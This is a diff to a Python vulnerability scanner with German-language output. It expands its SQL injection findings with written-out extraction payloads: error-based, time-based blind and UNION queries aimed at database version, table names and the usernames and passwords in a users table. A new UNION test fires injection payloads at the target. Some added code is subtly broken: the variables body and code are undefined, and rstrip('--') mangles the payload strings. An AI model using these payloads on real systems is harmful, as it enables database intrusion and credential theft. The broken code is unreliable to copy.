@@ -37,12 +37,24 @@ def scan(target):
                             'id': 'SQLI-001',
                             'severity': 'critical',
                             'type': 'sql_injection',
-                            'title': f'SQL Injection in "{param}"',
+                            'title': f"SQL Injection (Error-based) in Parameter '{param}' - DATEN AUSLESBAR!",
                             'url': url,
                             'parameter': param,
                             'payload': payload,
-                            'evidence': f'SQL Error: {err}',
-                            'remediation': 'Prepared Statements verwenden'
+                            'evidence': (
+                                f"SQL ERROR gefunden: '{err}'\n\n"
+                                f"=== Moegliche Daten-Extraktion: ===\n"
+                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--\n"
+                                f"    → DB-Version auslesen\n"
+                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--\n"
+                                f"    → DB-Name auslesen\n"
+                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--\n"
+                                f"    → ALLE Tabellennamen\n"
+                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,':',password) FROM users),0x7e))--\n"
+                                f"    → User + Passwoerter!\n\n"
+                                f"HTTP Status: {resp.status_code}"
+                            ),
+                            'remediation': 'Parameterized Queries/Prepared Statements verwenden. Eingabe validieren. ORM nutzen.'
                         })
                         return findings
             except:
@@ -65,14 +77,67 @@ def scan(target):
                         'id': 'SQLI-002',
                         'severity': 'critical',
                         'type': 'sql_injection_blind',
-                        'title': f'Blind SQL Injection (Time-based) in "{param}"',
+                        'title': f"Blind SQL Injection (Time-based) in Parameter '{param}' - DATEN AUSLESBAR!",
                         'url': url,
                         'parameter': param,
                         'payload': payload,
-                        'evidence': f'Response: {elapsed:.1f}s (Payload: {delay}s)',
-                        'remediation': 'Parameterized Queries, Timeouts setzen'
+                        'evidence': (
+                            f"Response dauerte {elapsed:.1f}s (Payload fordert {delay}s Delay).\n\n"
+                            f"=== Time-Based Daten-Extraktion (Buchstabe fuer Buchstabe): ===\n"
+                            f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(5),0)--\n"
+                            f"    → Ist erster Buchstabe der Version > 'A'?\n"
+                            f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--\n"
+                            f"    → Erster Buchstabe des Passworts > 'A'?\n"
+                            f"  {param}=1' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(5),0)--\n"
+                            f"    → Mehr als 10 Tabellen?\n\n"
+                            f"Mit 5s Delay pro Bit kann man die komplette DB auslesen!"
+                        ),
+                        'remediation': 'Parameterized Queries verwenden. Timeouts auf Application-Level setzen.'
                     })
                     return findings
+            except:
+                continue
+
+    # UNION-based Test
+    union_payloads = [
+        "1' UNION SELECT NULL--",
+        "1' UNION SELECT NULL,NULL--",
+        "1' UNION SELECT NULL,NULL,NULL--",
+        "1' UNION SELECT 'test','test','test'--",
+        "1 UNION SELECT NULL,NULL--",
+    ]
+    for param in params[:5]:
+        for payload in union_payloads:
+            try:
+                url = f"{target}?{param}={urllib.parse.quote(payload)}"
+                resp = requests.get(url, timeout=10, verify=False)
+                if body and ('NULL' in body or 'test' in body.lower()):
+                    if code == 200:
+                        col_count = payload.count('NULL') + (1 if 'test' in payload else 0)
+                        findings.append({
+                            'id': 'SQLI-003',
+                            'severity': 'critical',
+                            'type': 'sql_injection_union',
+                            'title': f"UNION SQL Injection in Parameter '{param}' - DIREKTER DATENZUGRIFF!",
+                            'url': url,
+                            'parameter': param,
+                            'payload': payload,
+                            'evidence': (
+                                f"UNION Payload reflektiert in Response. HTTP {resp.status_code}. {col_count} Spalten.\n\n"
+                                f"=== DIREKTE Daten-Extraktion via UNION: ===\n"
+                                f"  {param}={payload.rstrip('--')} version()--\n"
+                                f"    → DB-Version\n"
+                                f"  {param}={payload.rstrip('--')} user(),database()--\n"
+                                f"    → User + DB-Name\n"
+                                f"  {param}={payload.rstrip('--')} table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1--\n"
+                                f"    → Tabellen + Spalten\n"
+                                f"  {param}={payload.rstrip('--')} username,password FROM users--\n"
+                                f"    → ALLE User + Passwoerter!\n\n"
+                                f"UNION ist die SCHNELLSTE SQLi-Methode - direkter Zugriff!"
+                            ),
+                            'remediation': 'Prepared Statements. Spaltenanzahl validieren.'
+                        })
+                        return findings
             except:
                 continue
 
@@ -95,7 +160,7 @@ def scan(target):
                             'url': url,
                             'parameter': param,
                             'payload': payload,
-                            'evidence': f'Command Output: {ind}',
+                            'evidence': f'Command Output gefunden: "{ind}" in Response',
                             'remediation': 'OS-Commands vermeiden, Input validieren'
                         })
                         return findings
